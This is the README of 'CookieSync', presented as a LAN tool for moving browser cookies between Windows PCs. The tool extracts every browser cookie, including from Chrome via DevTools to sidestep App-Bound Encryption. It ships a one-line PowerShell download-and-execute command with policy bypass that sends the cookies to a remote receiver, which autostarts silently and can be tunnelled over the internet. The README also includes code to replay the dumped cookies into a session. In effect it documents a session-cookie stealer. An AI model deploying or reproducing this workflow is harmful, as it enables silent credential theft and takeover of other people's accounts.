# CookieSync

One-line, zero-interaction transfer of all browser cookies from one Windows PC to another
over your LAN.

Paste a single line on the source machine. The destination machine receives a timestamped
JSON dump in `dumps/` and the source machine goes back to whatever it was doing.

## How it works

```
  SOURCE PC (anywhere)                     DESTINATION PC (always running)
  ─────────────────────                    ────────────────────────────────
  1. UDP broadcast  ───────────────────►   2. receiver.py answers with its IP
  3. launch browser w/ DevTools  ───────►   4. reads Network.getAllCookies
  5. POST /cookies  ────────────────────►   6. saves dumps/<time>_<ip>.json
```

Cookie extraction runs two paths:

| Path | Covers |
|---|---|
| `browser_cookie3` (DPAPI + AES-GCM) | Firefox, and any Chromium build without App-Bound Encryption |
| Chrome DevTools Protocol | Chrome, Edge, Brave, Vivaldi, Opera — **immune to v20 / App-Bound Encryption** |

The CDP path is authoritative for Chromium browsers. It reads cookies from the live
browser process, so Chrome 127+ encryption is irrelevant.

## Requirements

- Windows 10/11 on both machines
- Python 3.9+ on both machines (tick **Add to PATH** in the installer)
- Both machines on the same LAN
- Destination machine reachable on TCP `8000` and UDP `50505`

## Quick start

### 1. Destination PC — set up once

```bat
git clone https://github.com/<you>/cookiesync.git
cd cookiesync
receiver\start_receiver.bat
```

Approve the Windows Firewall prompt (or let `install_autostart.bat` add the rules for you).

Then make it permanent:

```bat
receiver\install_autostart.bat
```

That adds firewall rules and drops a silent startup shortcut, so the receiver is up after
every reboot with no console window and no interaction.

### 2. Source PC — one line, every time

From PowerShell:

```powershell
powershell -NoP -Exec Bypass -c "iwr http://DEST_IP:8000/sender/fetch_and_run.bat -OutFile $env:TEMP\cs.bat; & $env:TEMP\cs.bat http://DEST_IP:8000"
```

Replace `DEST_IP` with the destination machine's address. That's the whole workflow.

## Other ways to run the sender

Clone the repo on the source machine and run locally:

```bat
sender\run.bat
```

It auto-discovers the receiver on the LAN. If discovery is blocked, point it manually:

```bat
sender\run.bat --host 192.168.1.50
```

Dump to a local file instead of sending anywhere:

```bat
sender\run.bat --out C:\temp\cookies.json
```

| Flag | Meaning |
|---|---|
| `--host HOST` | Skip discovery, send to this host |
| `--port N` | Override destination port (default 8000) |
| `--token T` | Auth token, must match the receiver |
| `--out FILE` | Write locally, send nothing |
| `--no-close-browsers` | Leave browsers open (less complete) |
| `--list-hosts` | Show discovered receivers, then exit |
| `--quiet` | No progress output |

## Configuration

Optional. Copy `config.example.json` to `config.json` in the repo root and edit. Both
sides read the same file, so a single config controls both.

```json
{
  "port": 8000,
  "token": "change-me",
  "discovery": true,
  "discovery_port": 50505,
  "serve_files": true,
  "host": "",
  "close_browsers": true,
  "debug_port": 9222
}
```

- `token` — if set, the receiver rejects any request without it. The sender must be given
  the same value (`--token` or config). Good hygiene if your LAN isn't trusted.
- `serve_files` — lets the receiver hand out the sender scripts for the one-liner. Set to
  `false` once every machine has a clone.
- `close_browsers` — the CDP path needs a free profile. `true` kills the browser, harvests,
  and leaves it closed.

## Output

`dumps/<YYYYmmdd_HHMMSS>_<source-ip>.json`

```json
{
  "_meta": { "host": "DESKTOP-ABC", "user": "you", "time": "2026-11-19T14:02:11" },
  "chrome": [ { "domain": ".example.com", "name": "sid", "value": "...", "path": "/", "secure": true, "expires": 1790000000 } ],
  "firefox": [ ... ],
  "_errors": [ "edge: profile locked" ]
}
```

Replay them with `requests`:

```python
import json, requests
for c in json.load(open("dump.json"))["chrome"]:
    sess.cookies.set(c["name"], c["value"], domain=c["domain"], path=c["path"])
```

Or import into any cookie-editor extension.

## Troubleshooting

**Sender finds no receiver.** Discovery uses UDP broadcast; some switches and guest networks
drop it. Pass `--host` explicitly.

**`sent 401`.** A token is set in `config.json` but wasn't passed. Add `--token`.

**Chrome returns nothing, `_errors` shows a timeout.** Chrome was already running when the
debug port tried to bind. Run without `--no-close-browsers`, or close Chrome first.

**Windows Firewall blocks the sender.** On the destination, allow the Python executable on
private networks, or re-run `install_autostart.bat`.

**Port already in use.** Change `port` in `config.json` and update the sender.

**Cookies come back empty for one browser.** Some builds store cookies in a secondary
profile. The sender walks every profile directory it finds, but a profile in use is locked —
close that browser.

## Security

Cookies are bearer credentials: a dump is enough to take over logged-in accounts.
- Keep the repo private and `dumps/` out of git (already in `.gitignore`).
- Traffic is plain HTTP. On a LAN that's acceptable; across the internet put
  `cloudflared tunnel --url http://localhost:8000` in front of the receiver and use the
  HTTPS URL.
- Treat `dumps/` like passwords. Delete old dumps.

## Uninstall

```bat
receiver\uninstall_autostart.bat
```

Removes the startup shortcut and firewall rules.

## License

MIT — see `LICENSE`.
